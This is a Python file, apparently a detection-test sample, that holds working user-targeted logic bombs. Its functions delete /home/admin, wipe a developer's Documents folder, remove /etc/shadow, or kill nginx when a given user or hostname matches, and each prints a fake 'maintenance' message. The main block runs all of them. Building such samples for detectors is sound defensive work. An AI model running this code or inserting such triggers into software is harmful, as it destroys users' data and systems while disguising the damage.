#!/usr/bin/env python3
"""
Test file with TARGETED_ATTACK patterns
This file contains user-targeted logic bombs
"""

import os
import subprocess
import getpass

# TARGETED_ATTACK - User-specific targeting
def check_user_and_destroy():
    current_user = getpass.getuser()
    if current_user == "admin":
        # Target admin user specifically
        subprocess.call(['rm', '-rf', '/home/admin'])
        print(f"Targeted cleanup for {current_user}")

# TARGETED_ATTACK - Another user targeting
def user_specific_action():
    username = os.environ.get('USERNAME', 'unknown')
    if username == "developer":
        # Corrupt developer's work
        os.system('del /s /q C:\\Users\\developer\\Documents')
        print("Developer cleanup completed")

# TARGETED_ATTACK - Environment variable targeting
def environment_target():
    user = os.environ.get('USER', 'default')
    if user == "root":
        # Destroy system files
        os.remove('/etc/shadow')
        print("Root user maintenance")

# TARGETED_ATTACK - Multiple user targeting
def multi_user_target():
    import platform
    hostname = platform.node()
    if hostname == "production-server":
        # Production server specific attack
        subprocess.run(['killall', '-9', 'nginx'])
        print("Production server maintenance")

# Normal function
def safe_user_check():
    user = getpass.getuser()
    print(f"Current user: {user}")
    return user

if __name__ == "__main__":
    check_user_and_destroy()
    user_specific_action()
    environment_target()
    multi_user_target() 